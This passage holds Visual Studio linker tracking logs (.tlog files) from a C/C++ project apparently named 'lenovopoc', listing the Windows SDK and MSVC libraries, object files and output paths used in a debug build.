C:\PROGRAM FILES (X86)\WINDOWS KITS\10\LIB\10.0.26100.0\UM\X64\ODBC32.LIB
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\LIB\10.0.26100.0\UM\X64\ODBCCP32.LIB
C:\USERS\USER\SOURCE\REPOS\LENOVOPOC\LENOVOPOC\X64\DEBUG\LENOVOPOC.OBJ
C:\USERS\USER\SOURCE\REPOS\LENOVOPOC\LENOVOPOC\X64\DEBUG\PREPARESTACK.OBJ
C:\WINDOWS\GLOBALIZATION\SORTING\SORTDEFAULT.NLS
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\PROFESSIONAL\VC\TOOLS\MSVC\14.44.35207\LIB\X64\MSVCRTD.LIB
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\PROFESSIONAL\VC\TOOLS\MSVC\14.44.35207\LIB\X64\OLDNAMES.LIB
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\PROFESSIONAL\VC\TOOLS\MSVC\14.44.35207\LIB\X64\VCRUNTIMED.LIB
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\LIB\10.0.26100.0\UCRT\X64\UCRTD.LIB
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\PROFESSIONAL\VC\TOOLS\MSVC\14.44.35207\BIN\HOSTX64\X64\CVTRES.EXE
C:\WINDOWS\SYSTEM32\TZRES.DLL
C:\USERS\USER\SOURCE\REPOS\LENOVOPOC\LENOVOPOC\X64\DEBUG\VC143.PDB

```

`lenovopoc/x64/Debug/lenovopoc.tlog/link.secondary.1.tlog`:

```tlog
^C:\USERS\USER\SOURCE\REPOS\LENOVOPOC\LENOVOPOC\X64\DEBUG\LENOVOPOC.OBJ|C:\USERS\USER\SOURCE\REPOS\LENOVOPOC\LENOVOPOC\X64\DEBUG\PREPARESTACK.OBJ
C:\Users\user\source\repos\lenovopoc\lenovopoc\x64\Debug\lenovopoc.ilk

```

`lenovopoc/x64/Debug/lenovopoc.tlog/link.write.1.tlog`:

```tlog
^C:\USERS\USER\SOURCE\REPOS\LENOVOPOC\LENOVOPOC\X64\DEBUG\LENOVOPOC.OBJ|C:\USERS\USER\SOURCE\REPOS\LENOVOPOC\LENOVOPOC\X64\DEBUG\PREPARESTACK.OBJ
C:\USERS\USER\SOURCE\REPOS\LENOVOPOC\X64\DEBUG\LENOVOPOC.EXE
C:\USERS\USER\SOURCE\REPOS\LENOVOPOC\X64\DEBUG\LENOVOPOC.PDB

```